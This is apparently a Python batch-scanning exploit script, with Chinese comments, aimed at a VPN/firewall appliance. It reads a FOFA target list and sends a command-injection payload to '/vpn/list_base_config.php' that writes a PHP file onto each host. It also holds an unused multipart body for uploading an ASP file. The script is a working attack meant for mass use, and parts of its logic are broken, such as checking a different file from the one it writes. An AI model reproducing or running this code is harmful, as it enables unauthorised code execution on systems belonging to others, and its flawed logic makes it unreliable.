# encoding:utf-8
import requests
import argparse
import ssl
import time
import multiprocessing
from tqdm import tqdm
requests.packages.urllib3.disable_warnings()

RED = '\033[91m'
RESET = '\033[0m'

file_path = "D:\\KillThem\\渗透测试\\信息收集\\fofaHack2.txt"

def result_quchong():
    # 去重列表内容
    with open(file_path, "r", encoding="ANSI") as result:
        url_list = result.readlines()
        print("开始去重结果中。。。。。。。")
        print("去重前的结果列表长度为：%d" %len(url_list))
        url_new_list = list(set(url_list))
        print("去重后的结果列表长度为：%d" %len(url_new_list))
    return url_new_list


def upload_studio_file(url,url2,result):
    # 批量扫描主代码
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
        # 'Content-Type':'multipart/form-data; boundary=--------------------------354575237365372692397370',
        # 'X-Requested-With':'XMLHttpRequest',
        # 'X-Token-Data':'whoami',
    }

    data = '''
----------------------------354575237365372692397370
Content-Disposition: form-data; name="file"; filename="5.txt"
Content-Type: image/jpeg

<% Response.Write("1") %>
----------------------------354575237365372692397370
Content-Disposition: form-data; name="fileName"

test_20240506.asp
----------------------------354575237365372692397370
Content-Disposition: form-data; name="Method"

UpdateUploadLinkPic
----------------------------354575237365372692397370
    '''



    try:
        # start_time = time.time()
        # response =  requests.post(url, headers=headers,data=data, verify=False, timeout=30)
        # response = requests.get(url)
        response = requests.get(url,verify=False,timeout=30)
        response2 = requests.get(url2, verify=False,timeout=30)
        # end_time = time.time()0
        # response_time = end_time - start_time
        if response.status_code == 200:
            if response.status_code == 200 and 'Version' in response2.text:
                print("响应状态码为200，内容为%s" %response.text)
                print(f"{RED}URL[{url2} 存在漏洞{RESET}")
                result.append(url)
            return response.text,result
        else:
            print(f"URL[{url}]漏洞并不存在，响应状态码:{response.status_code}")
    except requests.RequestException as e:
        print(f"URL[{url}] 请求失败：{e}")


if __name__ == '__main__':
    extend_uri = '/vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Finfo.php%60'
    extend_uri2 = "/tmp/fw.php"
    list1 = result_quchong()
    result = []
    processes = []
    # print(list1)
    print("开始进行检测----------------")
    for url in tqdm(list1):
        # url =  url.strip()
        url =  url.strip() + extend_uri
        # print(url)
        url2 = url.strip() + extend_uri2
        process = multiprocessing.Process(target=upload_studio_file(url,url2,result),)
        process.start()
        # upload_studio_file(url,result)
        print(result)
        # upload_studio_file(url,url2)